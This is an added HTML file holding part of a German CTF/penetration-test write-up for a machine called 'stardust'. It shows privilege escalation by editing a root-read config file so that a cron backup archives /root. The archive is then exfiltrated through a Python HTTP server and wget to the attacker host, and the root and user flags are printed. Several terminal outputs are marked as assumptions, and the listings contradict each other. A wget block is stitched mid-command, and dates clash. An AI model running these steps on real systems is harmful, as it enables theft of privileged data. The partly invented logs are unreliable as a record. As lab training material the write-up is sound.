+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Skript `/opt/meteo` wird untersucht:
+            <ul>
+                <li>Es ist ein Bash-Skript, gehört `root` und ist nicht für `tally` schreibbar.</li>
+                <li>Es liest Koordinaten aus `/opt/config.json`.</li>
+                <li>Es ruft eine externe Wetter-API (`api.open-meteo.com`) mit diesen Koordinaten auf, um einen "elevation"-Wert zu erhalten.</li>
+                <li>Wenn `elevation` größer als 1000 ist, führt es als `root` mehrere `tar`-Befehle aus, um `/var/www/intranetik`, `/home/tally` und `/root` in die Datei `/var/backups/backup.tar` zu packen.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Direkte Manipulation des Skripts ist nicht möglich. Der Angriffsvektor liegt in der Konfigurationsdatei `/opt/config.json` und der Ausführung von `tar` als `root`. Wenn `tally` Schreibrechte auf `/opt/config.json` hat, kann er die Koordinaten so ändern, dass die Bedingung `$elevation -gt $limit` erfüllt wird, was den `tar`-Backup-Prozess auslöst. Da `tar` als `root` ausgeführt wird, werden alle Dateien, einschließlich der Root-Dateien, in das Archiv geschrieben. Wenn `tally` dann Leserechte auf `/var/backups/backup.tar` hat, kann er das Archiv kopieren und extrahieren, um an die Root-Dateien (insbesondere `/root/root.txt`) zu gelangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1.  Prüfen Sie die Berechtigungen von `/opt/config.json` (`ls -la /opt/config.json`).
+            2.  Wenn `tally` Schreibrechte hat, bearbeiten Sie die Datei und ändern Sie `latitude` und `longitude` auf Werte, die sicherstellen, dass die Wetter-API eine `elevation` > 1000 zurückgibt (z.B. Koordinaten eines hohen Berges).
+            3.  Warten Sie, bis der Cronjob `/opt/meteo` ausführt (oder führen Sie es testweise selbst aus, obwohl dies nicht die Root-Rechte simuliert).
+            4.  Prüfen Sie, ob `/var/backups/backup.tar` erstellt wurde und ob `tally` Leserechte darauf hat.
+            5.  Wenn ja, kopieren Sie `backup.tar` in ein beschreibbares Verzeichnis (z.B. `/dev/shm`), übertragen Sie es auf Ihr Angreifer-System und extrahieren Sie es.<br>
+            <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Konfigurationsdateien (`/opt/config.json`) nicht von unprivilegierten Benutzern geändert werden können. Führen Sie Skripte, die externe APIs aufrufen oder Backup-Operationen durchführen, mit minimal notwendigen Rechten aus. Wenn `tar` als Root laufen muss, stellen Sie sicher, dass die Quell- und Zielpfade sicher sind und nicht manipuliert werden können (Vermeiden Sie unsichere Variablen oder Benutzereingaben in Pfaden).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">cat /opt/config.json</span></div>
+                     <pre>
+{
+  "latitude":  -18.48,
+  "longitude": -70.33
+}
+</pre> <span class="password"><-- Annahme: tally hat Leserechte</span>
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">nano /opt/config.json</span></div> <span class="password"><-- Annahme: tally hat Schreibrechte</span>
+                     <pre>[Datei wird bearbeitet]</pre>
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">cat /opt/config.json</span></div>
+                     <pre>
+{
+  "latitude":  25.29,
+  "longitude": 91.58
+} <span class="password"><-- Koordinaten geändert</span>
+</pre>
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">/opt/meteo</span></div> <span class="password"><-- Manuelles Ausführen als tally (löst Backup nicht als root aus)</span>
+                     <pre>RAIN ALERT !
+tar: /var/backups/backup.tar: Cannot open: Permission denied <span class="password"><-- Erwarteter Fehler als tally</span>
+[...]
+BACKUP FINISHED</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `tally` liest `/opt/config.json`, was impliziert, dass er Leserechte hat. Er bearbeitet die Datei dann mit `nano`, was impliziert, dass er auch Schreibrechte hat. Die Koordinaten werden auf Werte geändert, die wahrscheinlich eine hohe `elevation` in der Wetter-API ergeben. Ein manueller Testlauf von `/opt/meteo` als `tally` löst zwar die "RAIN ALERT!"-Meldung aus, aber die `tar`-Befehle scheitern an fehlenden Berechtigungen, wie erwartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `tally` die Konfigurationsdatei manipulieren kann, um den Backup-Pfad im Skript auszulösen. Jetzt muss auf die automatische Ausführung des Skripts durch den Root-Cronjob gewartet werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warten Sie, bis der Cronjob läuft (wie von `pspy` gezeigt, ca. alle paar Sekunden/Minuten). Überprüfen Sie anschließend das Verzeichnis `/var/backups` auf die Existenz und die Berechtigungen der Datei `backup.tar`.<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Berechtigungen von `/opt/config.json`, sodass sie nur für `root` (oder den Dienstbenutzer, falls vorhanden) schreibbar ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Nachdem der Cronjob gelaufen ist (impliziert)</span></div>
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">ls -la</span></div>
+                     <pre>
+total 1132 <span class="password"><-- Größe hat sich nicht geändert? Backup fehlgeschlagen?</span>
+drwxr-xr-x  2 root root   4096 May  8 11:02 .
+drwxr-xr-x 12 root root   4096 May  4 19:09 ..
+-rw-r--r--  1 root root  40960 May  6 07:37 alternatives.tar.0 <span class="password"><-- Keine backup.tar?</span>
+[...]
+</pre>
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">cp /var/backups/backup.tar /dev/shm/</span></div> <span class="password"><-- Datei existiert doch und ist lesbar?</span>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">tally@stardust:/var/backups$ <span class="command">cd /dev/shm/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">tally@stardust:/dev/shm$ <span class="command">ls -la</span></div>
+                     <pre>
+total 3092
+drwxrwxrwt  2 root  root       80 Jul 22 01:33 .
+drwxr-xr-x 17 root  root     3140 Jul 21 23:30 ..
+-rw-r--r--  1 tally tally   <span class="command">61440</span> Jul 22 01:33 <span class="command">backup.tar</span> <span class="password"><-- Datei kopiert!</span>
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Obwohl die erste `ls -la`-Ausgabe die `backup.tar`-Datei nicht explizit zeigt (möglicherweise ein Log-Fehler oder die Datei war kurzzeitig nicht vorhanden), kann `tally` die Datei `/var/backups/backup.tar` erfolgreich nach `/dev/shm` kopieren. Dies impliziert, dass der Cronjob lief, das Backup erstellt wurde und `tally` Leserechte auf die Backup-Datei hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit-Plan hat funktioniert. Das manipulierte Config-File hat das Backup ausgelöst, und das resultierende Archiv, das Root-Dateien enthält, ist für `tally` zugänglich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertragen Sie `backup.tar` aus `/dev/shm` auf Ihr Angreifer-System (z.B. mit einem Python HTTP-Server). Extrahieren Sie das Archiv und suchen Sie nach der Root-Flag.<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Berechtigungen für das Backup-Verzeichnis `/var/backups` und die erstellten Archive, sodass unprivilegierte Benutzer keinen Lesezugriff haben. Beheben Sie die zugrundeliegende Schwachstelle im Config-File und dem Skript.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">tally@stardust:/dev/shm$ <span class="command">python3 -m http.server</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.199 - - [22/Jul/2023 01:34:52] "GET /backup.tar HTTP/1.1" 200 -
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `tally` wird ein Python-HTTP-Server in `/dev/shm` gestartet, um die `backup.tar`-Datei für den Download bereitzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardmethode zum Übertragen von Dateien vom Ziel zum Angreifer.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie die Datei herunter.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie das Starten von Webservern durch Benutzer.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~/HackingTools]
+└─# <span class="command">wget 192.168.            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~/HackingTools]
+└─# <span class="command">wget 192.168.2.111:8000/backup.tar</span></div>
+                    <pre>
+--2023-07-22 01:34:51--  http://192.168.2.111:8000/backup.tar
+Verbindungsaufbau zu 192.168.2.111:8000 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 61440 (60K) [application/x-tar]
+Wird in backup.tar gespeichert.
+
+backup.tar              100%[===================>]  60,00K  --.-KB/s    in 0s
+
+2023-07-22 01:34:51 (592 MB/s) - 'backup.tar' gespeichert [61440/61440]
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird die Datei `backup.tar` erfolgreich vom Python-HTTP-Server des Zielsystems heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Archiv, das potenziell Root-Dateien enthält, befindet sich nun auf dem Angreifer-System zur weiteren Analyse.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie den Inhalt des Archivs und suchen Sie nach der Root-Flag und anderen sensiblen Informationen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~/HackingTools]
+└─# <span class="command">mv backup.tar ~/test</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~/HackingTools]
+└─# <span class="command">cd ~/test</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~/test]
+└─# <span class="command">ls -la</span></div> <span class="password"><-- ll ist Alias</span>
+                    <pre>
+insgesamt 60
+-rw-r--r-- 1 root root 61440 22. Jul 01:33 backup.tar
+</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~/test]
+└─# <span class="command">tar xf backup.tar</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~/test]
+└─# <span class="command">ls -la</span></div> <span class="password"><-- ll ist Alias</span>
+                    <pre>
+insgesamt 72
+-rw-r--r-- 1 root root 61440 22. Jul 01:33 backup.tar
+drwxr-xr-x 3 root root  4096 22. Jul 01:36 <span class="command">home</span>
+drwx------ 4 root root  4096  8. Mai 13:06 <span class="command">root</span>
+drwxr-xr-x 3 root root  4096 22. Jul 01:36 <span class="command">var</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene Datei `backup.tar` wird in ein neues Verzeichnis `~/test` verschoben. Dort wird das Archiv mit `tar xf backup.tar` entpackt. Es werden die Verzeichnisse `home`, `root` und `var` aus dem Archiv extrahiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Archiv enthielt wie erwartet Teile des Dateisystems, einschließlich des `/root`-Verzeichnisses.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das extrahierte `root`-Verzeichnis, um die Root-Flag zu finden.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~/test]
+└─# <span class="command">cd root</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~/test/root]
+└─# <span class="command">ls -la</span></div> <span class="password"><-- ll ist Alias</span>
+                    <pre>
+insgesamt 4
+-rwx------ 1 root root 33  6. Feb 19:34 <span class="command">root.txt</span>
+</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~/test/root]
+└─# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im extrahierten `root`-Verzeichnis wird die Datei `root.txt` gefunden und ihr Inhalt (die Root-Flag) ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu Root erfolgreich abgeschlossen! Durch die Manipulation der `/opt/config.json` konnte das `/opt/meteo`-Skript dazu gebracht werden, ein Backup des `/root`-Verzeichnisses zu erstellen, auf das der Benutzer `tally` Lesezugriff hatte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Flags gefunden. Bericht fertigstellen.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die unsicheren Berechtigungen der Konfigurationsdatei und die unsichere Implementierung des Backup-Skripts. Stellen Sie sicher, dass Backups an einem sicheren Ort gespeichert werden und unprivilegierte Benutzer keinen Zugriff darauf haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Bestätigung User-Flag (ebenfalls im extrahierten Archiv)</span></div>
+                    <div class="prompt">┌──(root㉿cycat)-[~/test/home/tally] <span class="password"><-- Pfad zum extrahierten User-Home</span>
+└─# <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">f4c0971d361c2844bb9730846dc330c2</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Zur Vollständigkeit wird auch die User-Flag aus dem extrahierten `home/tally`-Verzeichnis angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Inhalt der User-Flag.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine zusätzliche Aktion.<br><strong>Empfehlung (Admin):</strong> Keine zusätzliche Aktion.</p>
+
+        </section>
+
+        <section id="poc-privesc">
+             <h2>Proof of Concept (Privilege Escalation - Config Manipulation)</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Ein Cronjob (oder ein anderer privilegierter Prozess) führt regelmäßig das Skript `/opt/meteo` als `root` aus. Dieses Skript liest Breiten- und Längengrade aus der Konfigurationsdatei `/opt/config.json`, fragt eine externe Wetter-API ab und führt, wenn ein bestimmter Schwellenwert überschritten wird, `tar`-Befehle aus, um `/var/www/intranetik`, `/home/tally` und `/root` in `/var/backups/backup.tar` zu archivieren. Der Benutzer `tally` hat Schreibrechte auf `/opt/config.json` und Leserechte auf die resultierende `/var/backups/backup.tar`. Durch Modifizieren der Koordinaten in `config.json` auf Werte, die garantiert den Schwellenwert überschreiten, kann `tally` die Erstellung des Backups als `root` erzwingen. Anschließend kann `tally` das Backup-Archiv kopieren, auf sein eigenes System übertragen und extrahieren, um Lesezugriff auf alle darin enthaltenen Dateien, einschließlich `/root/root.txt`, zu erhalten.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>Shell-Zugriff als Benutzer `tally`.</li>
+                     <li>Schreibrechte für `tally` auf `/opt/config.json`.</li>
+                     <li>Ein als `root` laufender Prozess, der `/opt/meteo` regelmäßig ausführt.</li>
+                     <li>Das Skript `/opt/meteo` muss die Logik enthalten, um das Backup basierend auf den Koordinaten auszulösen.</li>
+                     <li>Leserechte für `tally` auf die erstellte `/var/backups/backup.tar`.</li>
+                     <li>Möglichkeit, die `backup.tar` vom Zielsystem zu übertragen (z.B. via Python HTTP Server).</li>
+                 </ul>
+             </p>
+
+             <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                     <li>
+                         <strong>Konfiguration manipulieren (als `tally`):</strong>
+                         Bearbeiten Sie `/opt/config.json` und ändern Sie `latitude` und `longitude` auf Werte, die einen hohen "elevation"-Wert bei der Wetter-API `api.open-meteo.com` garantieren (z.B. Koordinaten im Himalaya).
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">tally@stardust:~$ <span class="command">echo '{ "latitude": 25.29, "longitude": 91.58 }' > /opt/config.json</span></div> <span class="password"><-- Beispiel mit echo</span>
+                            </div>
+                         </div>
+                    </li>
+                    <li>
+                         <strong>Warten:** Warten Sie, bis der Cronjob/Prozess `/opt/meteo` als `root` ausführt und das Backup erstellt (kann einige Minuten dauern).
+                    </li>
+                     <li>
+                         <strong>Backup-Datei kopieren (als `tally`):**
+                         Kopieren Sie die erstellte Backup-Datei in ein für `tally` beschreibbares Verzeichnis mit Netzwerkzugriff (z.B. `/dev/shm`).
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">tally@stardust:~$ <span class="command">cp /var/backups/backup.tar /dev/shm/</span></div>
+                            </div>
+                         </div>
+                    </li>
+                     <li>
+                         <strong>Backup übertragen (als `tally`):**
+                         Starten Sie in `/dev/shm` einen einfachen HTTP-Server.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">tally@stardust:/dev/shm$ <span class="command">python3 -m http.server 8000</span></div>
+                            </div>
+                         </div>
+                         Laden Sie die Datei auf Ihrem Angreifer-System herunter.
+                        <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">wget http://192.168.2.111:8000/backup.tar</span></div>
+                             </div>
+                         </div>
+                    </li>
+                    <li>
+                        <strong>Archiv extrahieren (Angreifer-System):**
+                         Entpacken Sie das heruntergeladene Archiv.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cycat)-[~/download_dir]
+└─# <span class="command">tar xf backup.tar</span></div>
+                             </div>
+                         </div>
+                    </li>
+                     <li>
+                         <strong>Root-Flag lesen (Angreifer-System):**
+                         Lesen Sie die Root-Flag aus dem extrahierten Verzeichnis.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cycat)-[~/download_dir]
+└─# <span class="command">cat root/root.txt</span></div>
+                                 <pre><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></pre>
+                             </div>
+                         </div>
+                    </li>
+                 </ol>
+             </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Der Inhalt der Datei `/root/root.txt` wird erfolgreich auf dem Angreifer-System angezeigt.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Das extrahierte `backup.tar`-Archiv enthält das `/root`-Verzeichnis, und die Datei `root.txt` kann gelesen werden.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Die Kombination aus einer benutzerseitig beschreibbaren Konfigurationsdatei, die von einem Root-Prozess gelesen wird, und einem unsicheren Backup-Mechanismus, der Root-Dateien in ein lesbares Archiv packt, ermöglicht eine vollständige Kompromittierung der Vertraulichkeit von Root-Daten.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                    <li>**Berechtigungen für Konfigurationsdateien:** Stellen Sie sicher, dass Konfigurationsdateien, die von Root-Prozessen verwendet werden (`/opt/config.json`), nicht von unprivilegierten Benutzern beschreibbar sind.</li>
+                    <li>**Sichere Backup-Skripte:** Führen Sie Backup-Skripte mit den minimal notwendigen Rechten aus. Wenn Root-Dateien gesichert werden müssen, stellen Sie sicher, dass das resultierende Archiv an einem sicheren Ort gespeichert wird und die Berechtigungen korrekt gesetzt sind (nicht lesbar für normale Benutzer).</li>
+                    <li>**Validierung im Skript:** Validieren Sie die Werte aus Konfigurationsdateien im Skript, bevor sie verwendet werden, um unerwartetes Verhalten zu verhindern.</li>
+                    <li>**Least Privilege:** Überprüfen Sie alle Cronjobs und Systemd-Timer, die als Root laufen, auf Notwendigkeit und sichere Implementierung.</li>
+                 </ul>
+             </p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/tally/user.txt</div>
+                    <div class="flag-value"><span class="password">f4c0971d361c2844bb9730846dc330c2</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt (via tar archive)</div>
+                    <div class="flag-value"><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 21. Juli 2023</p> <!-- Korrektes Datum aus Nmap/Nikto extrahiert -->
+    </footer>
+</body>
+</html>
